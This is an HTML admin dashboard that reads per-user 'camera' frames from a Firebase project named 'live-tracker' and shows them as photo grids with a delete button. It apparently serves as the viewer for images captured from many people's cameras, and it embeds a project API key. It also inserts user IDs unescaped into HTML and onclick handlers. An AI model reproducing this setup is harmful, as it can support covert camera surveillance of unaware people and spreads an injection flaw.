<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Pro Admin Dashboard</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:#fff;
}

header{
  padding:18px;
  text-align:center;
  background:#111a2e;
  font-size:20px;
  font-weight:bold;
}

/* USERS STACK */
.container{
  display:flex;
  flex-direction:column;
  gap:15px;
  padding:15px;
}

/* USER CARD */
.userBox{
  background:#1e293b;
  border-radius:15px;
  padding:12px;
  width:100%;
}

/* IMAGE GRID */
.scroll{
  margin-top:10px;
  display:grid;
  grid-template-columns:repeat(4, 1fr);
  gap:10px;
  max-height:420px;
  overflow-y:auto;
  padding-right:5px;
}

/* RESPONSIVE */
@media(max-width:900px){
  .scroll{ grid-template-columns:repeat(3, 1fr); }
}
@media(max-width:600px){
  .scroll{ grid-template-columns:repeat(2, 1fr); }
}

/* IMAGE STYLE */
.scroll img{
  width:100%;
  height:120px;
  object-fit:cover;
  border-radius:10px;
  background:#0f172a;
  transition:0.2s;
}

.scroll img:hover{
  transform:scale(1.03);
}

/* BUTTON */
.btn{
  margin-top:8px;
  padding:8px 12px;
  border:none;
  border-radius:8px;
  cursor:pointer;
  font-weight:bold;
}

.deleteAll{
  background:#dc2626;
  color:white;
}
</style>
</head>

<body>

<header>🖥️ Professional Firebase Admin Dashboard</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>

// Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const grid = document.getElementById("grid");

// MAIN LISTENER
db.ref("camera").on("value", (snap) => {

  const data = snap.val();
  grid.innerHTML = "";

  if(!data){
    grid.innerHTML = "<p>No users found</p>";
    return;
  }

  Object.keys(data).forEach(userId => {

    const box = document.createElement("div");
    box.className = "userBox";

    box.innerHTML = `
      <h3>👤 ${userId}</h3>
      <button class="btn deleteAll" onclick="deleteAll('${userId}')">
        🗑️ Delete All
      </button>
      <div class="scroll" id="list_${userId}">Loading...</div>
    `;

    grid.appendChild(box);

    loadUserImages(userId);

  });

});

// LOAD IMAGES SAFELY
function loadUserImages(userId){

  const ref = db.ref("camera/" + userId);

  ref.on("value", (snap) => {

    const data = snap.val();
    const container = document.getElementById("list_" + userId);

    container.innerHTML = "";

    if(!data){
      container.innerHTML = "<p>No images</p>";
      return;
    }

    Object.keys(data).reverse().forEach(key => {

      const item = data[key];

      const img = document.createElement("img");

      // ✅ SAFE IMAGE LOADING
      img.src = item.frame || "";

      // fallback if broken
      img.onerror = () => {
        img.src = "https://via.placeholder.com/300x200?text=Image+Not+Found";
      };

      container.appendChild(img);

    });

  });

}

// DELETE ALL
function deleteAll(userId){

  if(confirm("Delete ALL photos of " + userId + "?")){

    db.ref("camera/" + userId).remove()
    .then(()=> alert("Deleted successfully"))
    .catch(err=> alert(err.message));

  }

}

</script>

</body>
</html>
